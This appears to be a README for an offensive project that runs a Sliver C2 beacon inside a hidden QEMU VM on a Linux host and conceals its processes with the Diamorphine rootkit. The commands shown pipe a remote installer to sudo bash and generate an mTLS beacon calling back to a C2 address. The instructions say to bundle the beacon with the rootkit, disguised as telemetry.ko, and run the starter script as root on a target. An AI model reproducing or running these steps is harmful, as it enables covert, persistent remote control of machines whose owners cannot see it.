Linux environment setup script that builds u-root, runs a concealed Sliver C2 agent in QEMU, and hides the process using Diamorphine rootkit.
Static network configuration.

Tested on Ubuntu 16.04.7 LTS (Xenial Xerus) (GNU/Linux 4.4.0-186-generic x86_64).

![Image 0](https://i.imgur.com/wGIcRK8.jpeg)

- Change IP address of your C2 server;
- Compile Sliver C2 beacon as following:
```bash
curl https://sliver.sh/install|sudo bash

sliver

generate beacon --mtls 10.4.10.10:443 --os linux --arch amd64 --format elf --save slivki

mtls --lport 443
```
- Add slivki (Sliver C2 beacon), telemetry.ko (Diamorphine rootkit) and deploy.sh script to a deploy.tar.gz archive and execute starter.sh on a host as root;


VM in QEMU:

![Image 1](https://i.imgur.com/yxWqAgM.jpeg)

Before rootkit execution:

![Image 2](https://i.imgur.com/uLHbYHd.jpeg)

QEMU processes hidden on a host:

![Image 3](https://i.imgur.com/jD5UP5b.jpeg)

Unhiden:

![Image 4](https://i.imgur.com/dTE7umq.jpeg)


---

Credits:

- https://github.com/m0nad/Diamorphine
- https://github.com/u-root/u-root
- https://github.com/qemu/qemu
- https://github.com/BishopFox/sliver


---

TODO:
- Use QEMU static binary https://github.com/ziglang/qemu-static instead of downloading it via apt;
- Use **macvtap** / l2tpv3 / af_xdp for networking.

NOTES

```bash
ip link add link enp0s3 name spf0 type macvtap mode bridge
ip link set spf0 up
./sq -kernel /boot/vmlinuz-$(uname -r) -initrd ./initramfs.linux_amd64.cpio -net nic,model=virtio,macaddr=$(cat /sys/class/net/spf0/address) -net tap,fd=3 3<>/dev/tap$(cat /sys/class/net/spf0/ifindex) -nographic -append "console=ttyS0"
```
